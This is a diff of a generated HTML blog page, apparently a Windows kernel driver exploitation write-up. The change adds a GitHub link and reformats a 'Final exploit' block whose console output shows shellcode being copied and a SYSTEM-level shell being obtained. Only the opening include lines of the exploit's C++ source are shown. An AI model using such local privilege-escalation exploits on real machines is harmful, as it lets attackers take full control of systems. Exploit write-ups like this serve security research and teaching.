@@ -31,6 +31,7 @@
 		    <div class="navbar-collapse collapse" id="navbar-main">
 		      <ul class="nav navbar-nav navbar-right">
                 <li class="active"><a href="/">Home</a></li>
+                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
 		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
 		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
 		        <li><a href="/feed.xml">RSS</a></li>
@@ -289,16 +290,16 @@
 
 <h2 id="final-exploit">Final exploit</h2>
 
-<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">E</span><span class="o">:</span><span class="err">\</span><span class="o">&gt;</span><span class="n">exploit</span><span class="p">.</span><span class="n">exe</span>
-<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Search</span> <span class="n">ntdll</span><span class="p">.</span><span class="n">dll</span><span class="p">...</span>
-<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Search</span> <span class="n">NtAllocateVirtualMemory</span><span class="p">...</span>
-<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Search</span> <span class="n">NtFreeVirtualMemory</span><span class="p">...</span>
-<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Allocate</span> <span class="n">memory</span><span class="p">...</span>
-<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Copy</span> <span class="n">the</span> <span class="n">shellcode</span><span class="p">...</span>
-<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Sending</span> <span class="n">force4</span> <span class="n">structure</span><span class="p">...</span>
-<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Free</span> <span class="n">the</span> <span class="n">shellcode</span> <span class="n">space</span><span class="p">...</span>
-<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">New</span> <span class="n">username</span><span class="o">:</span> <span class="n">Syst</span><span class="err">Þ</span><span class="n">me</span>
-<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Executing</span> <span class="n">a</span> <span class="n">new</span> <span class="n">command</span> <span class="n">console</span> <span class="n">to</span> <span class="k">test</span> <span class="n">it</span><span class="p">...</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-unknown" data-lang="unknown">E:\&gt;exploit.exe
+[+] Search ntdll.dll...
+[+] Search NtAllocateVirtualMemory...
+[+] Search NtFreeVirtualMemory...
+[+] Allocate memory...
+[+] Copy the shellcode...
+[+] Sending force4 structure...
+[+] Free the shellcode space...
+[+] New username: SystÞme
+[+] Executing a new command console to test it...</code></pre></figure>
 
 <figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;windows.h&gt;
 #include &lt;winioctl.h&gt;
